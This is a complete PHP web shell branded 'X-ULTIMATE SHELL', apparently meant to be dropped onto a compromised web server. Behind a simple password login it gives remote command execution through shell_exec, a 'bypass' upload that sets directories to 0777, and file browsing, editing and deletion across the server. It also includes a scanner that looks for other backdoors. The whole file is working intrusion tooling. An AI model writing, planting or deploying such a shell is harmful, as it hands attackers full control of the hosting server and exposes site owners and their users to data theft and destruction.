<?php
/**
 * THE X-ULTIMATE BYPASS - Mr.XycanKing 😈
 * PW = Xycan_Shell
 */
error_reporting(0);
set_time_limit(0);
session_start();

$password = "tbl";

if (isset($_GET['logout'])) { unset($_SESSION['login']); header("Location: ?"); }
if (!isset($_SESSION['login'])) {
    if (isset($_POST['pass']) && $_POST['pass'] == $password) { $_SESSION['login'] = true; } 
    else {
        die("<body style='background:#000;color:red;text-align:center;padding-top:100px;font-family:monospace;'>
        <form method='post'><h1>[ X-SHELL LOGIN ]</h1><input type='password' name='pass' style='background:#111;color:#0f0;border:1px solid red;'><br><br><input type='submit' value='ENTER'></form></body>");
    }
}

$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = str_replace('\\', '/', $path);
$os = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? "Windows" : "Linux";

echo "<style>
body{background:#000;color:#0f0;font-family:'Courier New',monospace;font-size:12px;padding:15px;}
.box{border:1px solid red;padding:10px;margin-bottom:10px;background:rgba(10,10,10,0.9);box-shadow:0 0 5px red;}
a{color:cyan;text-decoration:none;}
a:hover{color:red;}
table{width:100%;border-collapse:collapse;}
th,td{border:1px solid #333;padding:5px;text-align:left;}
th{background:red;color:#000;}
input,textarea{background:#111;color:#0f0;border:1px solid #444;padding:3px;}
.btn{background:red;color:#fff;border:none;cursor:pointer;padding:3px 10px;}
</style>";

echo "<h2>[ X-ULTIMATE SHELL - BY Mr.XycanKing ]</h2>";
echo "<div class='box'>OS: $os | IP: {$_SERVER['SERVER_ADDR']} | USER: ".get_current_user()." | <a href='?logout=1'>[ LOGOUT ]</a></div>";

// BREADCRUMB NAV
echo "<div class='box'>PATH: ";
$ps = explode('/', $path);
foreach($ps as $id => $p) {
    echo "<a href='?path=";
    for($i=0;$i<=$id;$i++) { echo $ps[$i]; if($i != $id) echo "/"; }
    echo "'>$p</a>/";
}
echo "</div>";

// BYPASS UPLOAD & SCANNER TOOLS
echo "<div class='box'>
<form method='POST' enctype='multipart/form-data'>
    <b>BYPASS UPLOAD:</b> <input type='file' name='f'> <input type='submit' name='up' value='FORCE UP' class='btn'>
</form>
<hr style='border:0.5px solid #333;'>
<b>TOOLS:</b> <a href='?path=$path&tool=scanner'>[ BACKDOOR SCANNER ]</a> | <a href='?path=$path&tool=cmd'>[ CMD EXEC ]</a>
</div>";

// TOOL: BACKDOOR SCANNER (Mencari file mencurigakan)
if($_GET['tool'] == 'scanner'){
    echo "<div class='box'><h3>[ BACKDOOR SCANNER ]</h3>";
    $files = scandir($path);
    foreach($files as $f){
        if(is_file($path.'/'.$f)){
            $cont = file_get_contents($path.'/'.$f);
            if(preg_match('/(base64_decode|eval|system|shell_exec|passthru)/i', $cont)){
                echo "<font color='yellow'>[!] Detected: $f (Contains Suspicious Functions)</font><br>";
            }
        }
    }
    echo "</div>";
}

// TOOL: CMD
if($_GET['tool'] == 'cmd'){
    echo "<div class='box'><form method='POST'>CMD: <input type='text' name='c' style='width:70%;'> <input type='submit' value='EXEC' class='btn'></form>";
    if($_POST['c']){ echo "<pre style='color:white;'>".shell_exec($_POST['c']." 2>&1")."</pre>"; }
    echo "</div>";
}

// UPLOAD LOGIC (ANTI-0KB & BYPASS)
if(isset($_POST['up'])){
    $d = $path.'/'.$_FILES['f']['name'];
    @chmod($path, 0777);
    if(@copy($_FILES['f']['tmp_name'], $d) || @move_uploaded_file($_FILES['f']['tmp_name'], $d) || @file_put_contents($d, file_get_contents($_FILES['f']['tmp_name']))){
        echo "<font color='lime'>[+] SUCCESS: ".basename($d)." (".filesize($d)." B)</font>";
    } else { echo "<font color='red'>[-] FAILED!</font>"; }
}

// FILE MANAGER TABLE
echo "<table><tr><th>NAME</th><th>SIZE</th><th>ACT</th></tr>";
foreach(scandir($path) as $i){
    if($i == '.' || $i == '..') continue;
    $f = $path.'/'.$i;
    $is_d = is_dir($f);
    echo "<tr>
    <td>".($is_d ? "<a href='?path=$f'>[ $i ]</a>" : $i)."</td>
    <td>".($is_d ? "DIR" : filesize($f)." B")."</td>
    <td>
        <a href='?path=$path&act=edit&item=$f'>Edit</a> | 
        <a href='?path=$path&act=del&item=$f'>Del</a>
    </td></tr>";
}
echo "</table>";

// ACTION HANDLERS
if($_GET['act'] == 'edit'){
    if(isset($_POST['s'])){ @file_put_contents($_GET['item'], $_POST['t']); echo "SAVED!"; }
    echo "<div class='box'><form method='POST'><textarea name='t' style='width:100%;height:200px;'>".htmlspecialchars(file_get_contents($_GET['item']))."</textarea><br><input type='submit' name='s' value='SAVE' class='btn'></form></div>";
}
if($_GET['act'] == 'del'){ @is_dir($_GET['item']) ? @rmdir($_GET['item']) : @unlink($_GET['item']); echo "<script>window.location='?path=$path';</script>"; }
?>